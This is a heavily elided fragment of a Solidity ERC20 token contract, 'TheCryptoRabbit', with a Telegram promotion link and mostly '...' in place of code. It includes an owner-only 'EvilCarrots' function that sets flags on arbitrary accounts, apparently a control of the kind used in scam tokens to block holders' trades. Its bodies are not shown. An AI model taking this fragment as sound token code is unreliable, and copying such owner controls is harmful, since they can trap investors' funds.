...
/**
 * NO BUNNIES TO BE FOUND HERE!
 * 
 * ONLY THE CRYPTO RABBIT!
 * 
 * https://t.me/TheCryptoRabbit
 **/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _launchTheRabbit(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
    ...
    function EvilCarrots(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20Rabbit is Context, ERC20 {
    constructor(
        ...
        _launchTheRabbit(owner, initialSupply, tmp6, tmp7);
    }
}

contract TheCryptoRabbit is ERC20Rabbit {
    constructor() ERC20Rabbit("TheCryptoRabbit", "RABBIT", false, true, 800, 25, msg.sender, 8000000000000 * 10 ** 18, msg.sender, 5) {
    }
}